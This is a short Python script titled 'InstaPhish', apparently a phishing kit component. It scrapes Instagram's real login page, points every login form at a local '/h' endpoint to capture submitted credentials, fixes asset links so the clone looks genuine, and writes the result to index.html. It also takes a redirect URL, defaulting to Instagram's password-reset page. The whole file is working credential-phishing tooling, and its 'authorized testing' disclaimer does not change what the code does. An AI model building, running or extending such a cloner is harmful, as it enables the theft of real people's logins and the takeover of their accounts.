#!/usr/bin/env python3
"""
InstaPhish - Template Generator
Copyright (c) 2024 r4tur1
For authorized security testing and educational purposes only.
"""

import requests
import sys
import urllib.parse
from bs4 import BeautifulSoup

LOGIN_URL = "https://www.instagram.com/accounts/login/"
OUTPUT     = "index.html"
REDIRECT   = sys.argv[1] if len(sys.argv) > 1 else "https://www.instagram.com/accounts/password/reset/"

def build():
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36'
    })
    r = s.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, 'html.parser')

    for f in soup.find_all('form'):
        f['action'] = '/h'
        f['method'] = 'post'
        f['id']     = 'loginForm'

    for t in soup.find_all(['link', 'script', 'img']):
        for a in ['href', 'src']:
            if t.has_attr(a) and t[a].startswith('/'):
                t[a] = urllib.parse.urljoin(LOGIN_URL, t[a])

    with open(OUTPUT, 'w', encoding='utf-8') as f:
        f.write(str(soup.prettify()))

    print(f"[+] Template saved to {OUTPUT}")
    print(f"[+] Redirect set to: {REDIRECT}")

if __name__ == '__main__':
    build()